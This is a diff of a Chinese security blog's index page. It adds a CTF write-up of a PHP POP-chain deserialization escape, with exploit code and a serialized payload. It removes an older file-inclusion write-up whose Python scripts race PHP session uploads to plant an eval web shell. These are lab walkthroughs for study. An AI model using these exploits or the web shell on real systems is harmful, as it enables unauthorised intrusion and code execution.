@@ -172,6 +172,96 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-pop链4之反序列化逃逸" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/10/14/pop%E9%93%BE4%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/" class="article-date">
+  	<time datetime="2021-10-13T16:00:00.000Z" itemprop="datePublished">2021-10-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/14/pop%E9%93%BE4%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/">
+        pop链4之反序列化逃逸
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="pop链4之反序列化逃逸-GYCTF2020-Easyphp"><a href="#pop链4之反序列化逃逸-GYCTF2020-Easyphp" class="headerlink" title="pop链4之反序列化逃逸([GYCTF2020]Easyphp)"></a>pop链4之反序列化逃逸([GYCTF2020]Easyphp)</h1><p>打开页面，发现是一个登录界面，所以我们尝试sql注入闭合测试，发现不行，然后dirsearch扫描目录，发现有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.zip</span><br></pre></td></tr></table></figure>
+<p>泄露，所以审计源码</p>
+<p>在lib.php中的User类中的__destruct()方法有一个危险函数file_get_contents()，但是由于safe函数过滤掉了flag，所以不可以使用，所以我们可以看向update.php文件，发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($_SESSION[&#x27;login&#x27;]===1)&#123;</span><br><span class="line">	require_once(&quot;flag.php&quot;);</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是如何让$_SESSION[‘login’]=1，我们可以看向lib.php文件中的User类中的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;id)&#123;</span><br><span class="line">$_SESSION[&#x27;id&#x27;]=$this-&gt;id;</span><br><span class="line">$_SESSION[&#x27;login&#x27;]=1;</span><br></pre></td></tr></table></figure>
+<p>我们可以看见只要存在$this-&gt;id就是可以让$_SESSION[‘login’]为1，而$this-&gt;id实际为dbCtrl类的login()方法中的$idResult，而如果要让return $idResult，则要么</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($this-&gt;token==&#x27;admin&#x27;) &#123;</span><br><span class="line">    return $idResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>要么绕过这个if</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (md5($this-&gt;password)!==$passwordResult)</span><br></pre></td></tr></table></figure>
+<p>而$passwordResult是从数据库中读出来的，所以我们需要控制提交的sql语句，从而绕过if，得到$passwordResult，所以我们要想办法调用dbCtrl类的login()方法，且参数的值为自定义的sql语言，所以我们可以构造pop链</p>
+<p>魔术方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__call：对象调用不可访问的函数时可以触发</span><br><span class="line"></span><br><span class="line">__toString()：当类的对象被当作字符串操作时会被调用</span><br></pre></td></tr></table></figure>
+
+<p>所以我们可以构造一条pop链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UpdateHelper::__destruct() --&gt; User::__toString() --&gt; info::__call()</span><br></pre></td></tr></table></figure>
+<p>所以可以exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age=&#x27;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;;</span><br><span class="line">    public $nickname;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname=&quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser=&quot;root&quot;;</span><br><span class="line">    public $dbpass=&quot;root&quot;;</span><br><span class="line">    public $database=&quot;test&quot;;</span><br><span class="line">    public $name=&#x27;admin&#x27;;</span><br><span class="line">    public $password=&#x27;1&#x27;;//字符串1，不是数字1</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new UpdateHelper();</span><br><span class="line">$a-&gt;sql=new User();</span><br><span class="line">$a-&gt;sql-&gt;nickname=new Info();</span><br><span class="line">$a-&gt;sql-&gt;nickname-&gt;CtrlCase=new dbCtrl();</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>而由于这里是反序列化实例化对象，所以我们也需要将上面得到的结果放入Info类中，exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age=&#x27;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;;</span><br><span class="line">    public $nickname;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname=&quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser=&quot;root&quot;;</span><br><span class="line">    public $dbpass=&quot;root&quot;;</span><br><span class="line">    public $database=&quot;test&quot;;</span><br><span class="line">    public $name=&#x27;admin&#x27;;</span><br><span class="line">    public $password=&#x27;1&#x27;;//字符串1，不是数字1</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new UpdateHelper();</span><br><span class="line">$a-&gt;sql=new User();</span><br><span class="line">$a-&gt;sql-&gt;nickname=new Info();</span><br><span class="line">$a-&gt;sql-&gt;nickname-&gt;CtrlCase=new dbCtrl();</span><br><span class="line"></span><br><span class="line">$b=new Info();</span><br><span class="line">$b-&gt;nickname=serialize($a);</span><br><span class="line">echo srialize($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;s:447:&quot;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:71:&quot;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于它还要经过序列化，所以我们可以通过反序列化逃逸来绕过它这次的序列化，我们可以将这部分分离出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:71:&quot;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后在前面加上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;s:8:&quot;CtrlCase&quot;;</span><br></pre></td></tr></table></figure>
+<p>因为要与原来的一样，然后由于有safe函数，所以可以利用union替换为hacker增加一个字符，所以我们可以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:71:&quot;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;;&#125;</span><br></pre></td></tr></table></figure>
+<p>此时$_SESSION[‘token’]=”admin”，所以我们回到登录界面，任意登录即可获得flag</p>
+<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/21b5dd45724c]">https://www.jianshu.com/p/21b5dd45724c]</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-table语句" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1094,98 +1184,6 @@
 <p>所以我们需要输入json编码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:0&#125;</span><br></pre></td></tr></table></figure>
 <p>即可绕过第三个if，而原因好像是当我们这样构造时，输入进去的是int类型，而在比较时会转换为相同的数据类型，所以才会通过第三个if</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-重定向以及session文件包含以及php临时文件包含" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/10/07/%E9%87%8D%E5%AE%9A%E5%90%91%E4%BB%A5%E5%8F%8Asession%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BB%A5%E5%8F%8Aphp%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
-  	<time datetime="2021-10-06T16:00:00.000Z" itemprop="datePublished">2021-10-07</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/07/%E9%87%8D%E5%AE%9A%E5%90%91%E4%BB%A5%E5%8F%8Asession%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BB%A5%E5%8F%8Aphp%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-        重定向以及session文件包含以及php临时文件包含
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="重定向以及session文件包含以及php临时文件包含"><a href="#重定向以及session文件包含以及php临时文件包含" class="headerlink" title="重定向以及session文件包含以及php临时文件包含"></a>重定向以及session文件包含以及php临时文件包含</h1><h2 id="实例-NPUCTF2020-ezinclude"><a href="#实例-NPUCTF2020-ezinclude" class="headerlink" title="实例([NPUCTF2020]ezinclude)"></a>实例([NPUCTF2020]ezinclude)</h2><p>打开页面源码，发现有一个提示</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br></pre></td></tr></table></figure>
-<p>然后抓包并发送，回显的包中的set-cookie字段有一个hash值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: Hash=fa25e54758d5d5c1927781a6ede89f8a</span><br></pre></td></tr></table></figure>
-<p>所以推测是pass的值，所以构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pass=fa25e54758d5d5c1927781a6ede89f8a</span><br></pre></td></tr></table></figure>
-
-<p>发现出现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location.href=&quot;flflflflag.php&quot;;</span><br></pre></td></tr></table></figure>
-<p>字段，当在浏览器构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php</span><br></pre></td></tr></table></figure>
-<p>发现出现404页面，然后通过抓包后同样get提交</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php</span><br></pre></td></tr></table></figure>
-<p>发现原来是重定向，但是通过bp抓包，可以绕过，所以抓包构造/flflflflag.php，发现是文件包含</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include($_GET[&quot;file&quot;])</span><br></pre></td></tr></table></figure>
-<p>但是不知道flag.php在哪一个文件中，但是通过目录扫描，发现有一个dir.php文件，里面有临时文件的信息，而php7有一个特性，就是当利用过滤器strip_tags来从字符串中去除HTML和PHP标记时，可以让php执行时直接出现Segment Fault（段故障），这样php的垃圾回收机制就不会继续执行，导致post提交的文件会保存在临时文件夹中不会被清除，而访问dir.php可以知道此时post上传文件的名字</p>
-<p>所以我们可以利用php伪协议来调用strip_tags过滤器，并与此同时post提交文件，致使php执行时出现Segment Fault，post提交的文件会保存在临时文件夹中<br>所以我们可以利用这个漏洞以及inculde()函数的包含来任意代码执行，因此exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line">url=&quot;http://b029c3b5-3789-4d78-9258-1ff98f05a610.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br><span class="line">payload=&quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">files=&#123;</span><br><span class="line">    &quot;file&quot;:BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url=url,files=files,allow_redirects=False)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
-<p>此时，只要访问dir.php，即可知道post提交的文件的文件名为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(9) &quot;phpfx0Sxt&quot; </span><br></pre></td></tr></table></figure>
-<p>然后我们在构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php?file=/tmp/phpfx0Sxt</span><br></pre></td></tr></table></figure>
-<p>对文件进行包含，即可执行代码，注意要抓包提交，在浏览器提交的话会重定向到404.html文件中，然后ctrl+F找flag字段即可，由于有include()函数，所以也可以尝试以下session文件包含</p>
-<p>在session中上传的数据会保存在sess_{sessid}中，然后系统会对这个文件进行检测，有害则删除，无害则留下，所以我们可以利用检测的时间，对这个文件进行包含，从而执行代码，所以我们可以写exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">host = &#x27;http://b65810ac-4e60-430f-a394-3ee290d0158d.node4.buuoj.cn:81/flflflflag.php&#x27;</span><br><span class="line">sessid = &#x27;feng&#x27;</span><br><span class="line"></span><br><span class="line">def POST(session):</span><br><span class="line">    while True:</span><br><span class="line">        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php system(&#x27;ls /&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;&quot;&#125;,</span><br><span class="line">            files=&#123;&quot;file&quot;:(&#x27;a.txt&#x27;, f)&#125;,</span><br><span class="line">            cookies=&#123;&#x27;PHPSESSID&#x27;:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">def READ(session):</span><br><span class="line">    while True:</span><br><span class="line">        response = session.get(f&#x27;&#123;host&#125;?file=/tmp/sess_&#123;sessid&#125;&#x27;)</span><br><span class="line">        # print(response.text)</span><br><span class="line">        if &#x27;c4ca4238a0b923820dcc509a6f75849b&#x27; not in response.text:</span><br><span class="line">            print(&#x27;[+++]retry&#x27;)</span><br><span class="line">            print(response.text)</span><br><span class="line">        else:</span><br><span class="line">            print(response.text)</span><br><span class="line">            sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() as session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = True</span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>其中这串代码就是我们想要执行的恶意代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;ls /&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
-<p>而这串代码的意思是会在根目录下创建shell.php文件，且shell文件中内容为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[cmd])?&gt;</span><br></pre></td></tr></table></figure>
-<p>所以我们直接构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/shell.php</span><br><span class="line"></span><br><span class="line">post提交：cmd=phpinfo();</span><br></pre></td></tr></table></figure>
-<p>即可看到php版本信息，然后找flag字段就可以获得flag</p>
-<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.icode9.com/content-4-1033782.html]">https://www.icode9.com/content-4-1033782.html]</a>
- </p>
 
       
     </div>
